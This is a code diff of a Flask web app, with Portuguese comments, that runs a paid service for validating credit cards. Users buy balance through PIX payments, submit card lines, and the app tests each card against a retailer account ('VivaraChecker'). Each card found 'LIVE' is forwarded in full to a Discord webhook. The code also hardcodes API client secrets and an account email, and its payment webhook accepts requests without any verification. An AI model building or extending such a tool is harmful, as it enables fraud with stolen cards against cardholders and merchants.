@@ -19,6 +19,8 @@ MISTICPAY_CLIENT_ID = os.environ.get("MISTICPAY_CLIENT_ID", "ci_libdweclsjyry50"
 MISTICPAY_CLIENT_SECRET = os.environ.get("MISTICPAY_CLIENT_SECRET", "cs_kknlfy76fe2ir4nqjydf8ebee")
 MISTICPAY_API_URL = "https://api.misticpay.com/api"
 
+status_file = "check_status.json" # To store real-time status if needed
+
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 VIVARA_EMAIL = os.environ.get("VIVARA_EMAIL", "p808409@gmail.com")
@@ -49,7 +51,7 @@ def send_to_discord(card_line, user_email):
     except Exception as e:
         print(f"[DISCORD] Erro ao enviar webhook: {e}")
 
-# Instanciando o checker
+# Instanciando o checker (usando a nova classe VivaraChecker)
 checker_service.checker_instance = VivaraChecker(VIVARA_EMAIL, VIVARA_PASSWORD)
 
 @app.route('/')
@@ -144,14 +146,10 @@ def create_deposit():
             return jsonify({"success": False, "message": f"Erro Misticpay: {res.text}"}), 400
             
         response_data = res.json()
-        
-        # Debug: log da resposta para ajudar a identificar a estrutura
         print(f"[DEBUG] Misticpay Response: {response_data}")
         
-        # Extrair dados da resposta corretamente
         mistic_data = response_data.get('data', response_data)
         
-        # PIX Copia e Cola - procurar pelas chaves conhecidas
         pix_code = (
             mistic_data.get('copyPaste') or 
             mistic_data.get('pixCopiaECola') or 
@@ -160,24 +158,20 @@ def create_deposit():
             mistic_data.get('pixCode', '')
         )
         
-        # QR Code - extrair a URL ou gerar a partir do PIX
         qr_code_url = (
             mistic_data.get('qrcodeUrl') or 
             mistic_data.get('qrCodeUrl') or 
             mistic_data.get('qrcodeImage', '')
         )
         
-        # Se temos o PIX mas não temos QR code URL, gerar um
         if pix_code and not qr_code_url:
             qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={pix_code}"
         
-        # Se não temos PIX, retornar erro
         if not pix_code:
             return jsonify({"success": False, "message": "PIX não gerado pela Misticpay. Verifique as credenciais."}), 400
         
         db_id = mistic_data.get('transactionId', transaction_id)
         
-        # Save to Supabase payments table
         payment_data = {
             "user_id": user_id,
             "amount": amount,
@@ -199,22 +193,6 @@ def create_deposit():
     except Exception as e:
         return jsonify({"success": False, "message": str(e)}), 500
 
-# Endpoint to mock a webhook approval for local testing without real payments
-@app.route('/api/deposit/dev-approve', methods=['POST'])
-def dev_approve_deposit():
-    if 'user_id' not in session: return jsonify({"error": "unauth"}), 401
-    
-    user_id = session['user_id']
-    amount = float(request.json.get('amount', 0))
-    
-    try:
-        curr_profile = supabase.table('profiles').select('balance').eq('id', user_id).execute().data[0]
-        new_balance = float(curr_profile['balance']) + amount
-        supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
-        return jsonify({"success": True, "message": "Pagamento aprovado e saldo atualizado!"})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)}), 500
-
 @app.route('/api/webhook/misticpay', methods=['POST'])
 def handle_misticpay_webhook():
     try:
@@ -223,60 +201,24 @@ def handle_misticpay_webhook():
         status = webhook_data.get('status')
         value = webhook_data.get('value', 0)
         
-        print(f"[WEBHOOK] Recebido: transactionId={transaction_id}, status={status}, value={value}")
-        
-        if not transaction_id or not status:
-            print("[WEBHOOK] Dados inválidos recebidos")
-            return jsonify({"success": False, "message": "Dados inválidos"}), 400
-        
-        # Buscar o pagamento no banco
-        payment = supabase.table('payments').select('*').eq('misticpay_id', str(transaction_id)).execute()
-        
-        if not payment.data:
-            # Tentar buscar pelo pix_id também
-            payment = supabase.table('payments').select('*').eq('pix_id', str(transaction_id)).execute()
-        
-        if not payment.data:
-            print(f"[WEBHOOK] Pagamento não encontrado para transaction_id: {transaction_id}")
-            return jsonify({"success": False, "message": "Pagamento não encontrado"}), 404
-        
-        payment_record = payment.data[0]
-        user_id = payment_record['user_id']
-        amount = payment_record['amount']
-        
-        print(f"[WEBHOOK] Pagamento encontrado: user_id={user_id}, amount={amount}")
-        
         if status == "COMPLETO":
-            # Atualizar status do pagamento
-            supabase.table('payments').update({
-                'status': 'completed',
-                'completed_at': datetime.now(timezone.utc).isoformat()
-            }).eq('id', payment_record['id']).execute()
-            
-            # Atualizar saldo do usuário
-            profile = supabase.table('profiles').select('balance').eq('id', user_id).execute()
-            if profile.data:
-                current_balance = float(profile.data[0]['balance'])
-                new_balance = current_balance + amount
+            payment = supabase.table('payments').select('*').eq('misticpay_id', str(transaction_id)).execute()
+            if payment.data:
+                payment_record = payment.data[0]
+                user_id = payment_record['user_id']
+                amount = payment_record['amount']
+                
+                # Check current balance
+                profile = supabase.table('profiles').select('balance').eq('id', user_id).execute().data[0]
+                new_balance = float(profile['balance']) + amount
                 supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
-                print(f"[WEBHOOK] Saldo atualizado: {current_balance} -> {new_balance}")
-            
-            return jsonify({"success": True, "message": "Pagamento processado com sucesso"}), 200
-        elif status == "FALHA":
-            # Marcar como falha
-            supabase.table('payments').update({
-                'status': 'failed',
-                'failed_at': datetime.now(timezone.utc).isoformat()
-            }).eq('id', payment_record['id']).execute()
-            print(f"[WEBHOOK] Pagamento marcado como falha")
-            return jsonify({"success": True, "message": "Pagamento falhou"}), 200
-        else:
-            # Outros status
-            print(f"[WEBHOOK] Status {status} recebido, apenas acknowlegding")
-            return jsonify({"success": True, "message": f"Status atualizado: {status}"}), 200
-            
+                
+                # Mark payment as completed
+                supabase.table('payments').update({'status': 'completed'}).eq('id', payment_record['id']).execute()
+                
+            return jsonify({"success": True}), 200
+        return jsonify({"success": True}), 200
     except Exception as e:
-        print(f"[WEBHOOK] Erro: {str(e)}")
         return jsonify({"success": False, "message": str(e)}), 500
 
 @app.route('/api/check_card', methods=['POST'])
@@ -287,46 +229,32 @@ def check_card():
     data = request.json
     card_line = data.get('card', '')
     
-    print(f"[check_card] Recebido card: {card_line[:6]}****")
-
     if not card_line:
         return jsonify({"success": False, "message": "Cartão inválido", "status": "DIE"}), 400
 
     user_id = session['user_id']
     
     try:
-        print(f"[check_card] Buscando saldo do user {user_id}")
-        profile = supabase.table('profiles').select('balance').eq('id', user_id).execute().data[0]
+        profile = supabase.table('profiles').select('balance, email').eq('id', user_id).execute().data[0]
         balance = float(profile['balance'])
-        print(f"[check_card] Saldo: {balance}")
         
-        if balance <= 1.0:
-            return jsonify({"success": False, "message": "Saldo insuficiente (Mínimo R$ 1.00 para checar)", "status": "DIE"}), 403
+        if balance < 1.0:
+            return jsonify({"success": False, "message": "Saldo insuficiente", "status": "DIE"}), 403
         
-        print(f"[check_card] Iniciando checker...")
+        # Test the card
         result = checker_service.checker_instance.test_card(card_line)
-        print(f"[check_card] Resultado: {result}")
         
-        if "ERROR" in result:
-            return jsonify({"success": False, "message": result, "status": "DIE"}), 500
-            
         if result == "LIVE":
             new_balance = balance - 1.0
             supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
+            send_to_discord(card_line, profile.get('email', 'Desconhecido'))
             
-            # Notificar Discord
-            user_email = profile.get('email', 'Desconhecido')
-            send_to_discord(card_line, user_email)
-            
-        return jsonify({"success": True, "status": result, "message": "Verificado com sucesso"})
+        return jsonify({"success": True, "status": result})
         
     except Exception as e:
         tb = traceback.format_exc()
         print(f"[check_card] ERRO COMPLETO:\n{tb}")
         return jsonify({"success": False, "message": str(e), "status": "DIE"}), 500
-
-def open_browser():
-    webbrowser.open_new('http://127.0.0.1:5000/')
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
